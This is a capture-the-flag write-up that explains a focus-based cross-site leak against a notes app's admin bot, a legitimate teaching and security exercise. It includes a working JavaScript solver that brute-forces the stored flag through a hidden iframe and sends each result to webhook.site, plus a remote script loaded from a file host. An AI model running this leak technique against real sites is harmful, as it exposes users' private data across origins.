# Average Contrived Notes App - Writeup

## Challenge summary

This is a notes app with an admin bot.

The bot does two things:

1. It opens the notes app.
2. It types the flag into the note box and saves it.
3. It then visits an attacker-controlled URL.

So the whole challenge is: make the bot leak the note it just created.

## Relevant source review

### `bot.js`

The important behavior is:

- open `SITE`
- type `FLAG` into `#note-input`
- click save
- open attacker URL in a second page

That means whatever state the notes page uses is already populated before the attacker page loads.

### `index.js`

Important routes:

- `GET /api/notes`
- `POST /api/notes`
- `POST /api/bot`
- `GET /image`
- `GET /script`

At first glance `/image` and `/script` look interesting because they reflect notes into the `x-meow-meow` header, but that path is not enough by itself cross-site.

### `templates/index.html`

This file contains the actual bug chain.

Important details:

- `main()` prefers `localStorage.getItem('notes')` over a fresh `/api/notes` fetch
- searching is done with `/?search=...`
- notes are rendered as clickable anchors:

```html
const card = document.createElement('a')
card.className = 'note-card'
card.id = `note-${i}`
card.href = `/?search=${n}`
card.textContent = n
```

So when a search returns at least one result, the page contains an element with id `note-0`.

When there are no results, the page instead renders:

```html
empty.id = 'note-none'
```

That distinction is what makes the leak possible.

## What did not work

A lot of obvious ideas are dead ends:

- direct XSS: notes are rendered with `textContent`
- cookie-based cross-site subresource reads: blocked by normal cookie behavior
- popup tricks: blocked in headless Chrome
- cross-origin iframe `javascript:` tricks: blocked
- `/image` and `/script` header leaks: not directly readable cross-origin

So the solve is not a straight XSS and not a straight CSRF read.

## The actual bug: fragment-focus XS-Leak

The key browser primitive is:

- load the notes page in an iframe with a URL like:

```text
https://average-contrived-notes-app.shrimple.de/?search=GUESS#note-0
```

- if the search result exists, the page contains `<a id="note-0">...`
- navigating to `#note-0` focuses that anchor
- when the iframe steals focus, the attacker page receives a `blur` event

If the search has no result, `#note-0` does not exist, so no focus jump happens and no `blur` is fired.

That gives a clean yes/no oracle:

- `blur` => the guess exists in the admin note list
- no `blur` => the guess does not exist

## Why this leaks the flag

The flag is stored as a note by the bot before our page opens.

The app supports substring search, not just prefix search:

```js
req.session.notes.filter((note) => {
  return note.includes(req.query.search)
})
```

So we can grow the known flag one character at a time:

- start with `RS{`
- try `RS{a`, `RS{b`, `RS{c`, ...
- whichever one causes the iframe to focus `#note-0` is the next correct character
- repeat until `}`

In practice the alphabet was:

```text
abcdefghijklmnopqrstuvwxyz0123456789_}
```

## Delivery

The live bot would execute pages served from:

```text
http://54.172.102.128/base64/<base64-html>
```

That was useful because:

- it was a plain HTTP origin
- it allowed custom HTML/JS
- it reliably executed in the bot

For larger payloads, I used a tiny HTML loader there and put the real extraction script on Catbox as a `.js` file, then loaded it with:

```html
<script src="https://files.catbox.moe/...js"></script>
```

Progress was exfiltrated to `webhook.site`.

## Extraction logic

This is the core idea of the solver:

```js
const CHARS = 'abcdefghijklmnopqrstuvwxyz0123456789_}';
let prefix = 'RS{';

async function test(q) {
  return await new Promise((resolve) => {
    let done = false;
    let ifr;

    const finish = (v) => {
      if (done) return;
      done = true;
      window.removeEventListener('blur', onBlur);
      if (ifr) ifr.remove();
      setTimeout(() => {
        window.focus();
        resolve(v);
      }, 20);
    };

    const onBlur = () => finish(true);
    window.addEventListener('blur', onBlur);

    ifr = document.createElement('iframe');
    ifr.style =
      'position:absolute;left:0;top:0;width:220px;height:140px;opacity:0.01;border:0';
    ifr.src =
      'https://average-contrived-notes-app.shrimple.de/?search=' +
      encodeURIComponent(q) +
      '#note-0';
    document.body.appendChild(ifr);

    setTimeout(() => finish(false), 250);
  });
}

(async () => {
  for (;;) {
    for (const c of CHARS) {
      if (await test(prefix + c)) {
        prefix += c;
        navigator.sendBeacon('https://webhook.site/...?...=' + encodeURIComponent(prefix));
        if (c === '}') return;
        break;
      }
    }
  }
})();
```

## Recovered flag buildup

The extraction converged through these checkpoints:

- `RS{wh00p`
- `RS{wh00ps_m4yb3_th`
- `RS{wh00ps_m4yb3_th4t_sh0uldn7_h`
- `RS{wh00ps_m4yb3_th4t_sh0uldn7_h4v3_b`
- `RS{wh00ps_m4yb3_th4t_sh0uldn7_h4v3_b33n_4_l1`
- `RS{wh00ps_m4yb3_th4t_sh0uldn7_h4v3_b33n_4_l1nk}`

## Short version

The challenge is solved with a focus-based XS-Leak:

- bot saves the flag as a note
- attacker iframes the notes page with `?search=GUESS#note-0`
- if the guess matches the flag substring, `note-0` exists and gets focused
- that fires `blur` in the attacker page
- use that yes/no oracle to brute-force the flag one character at a time
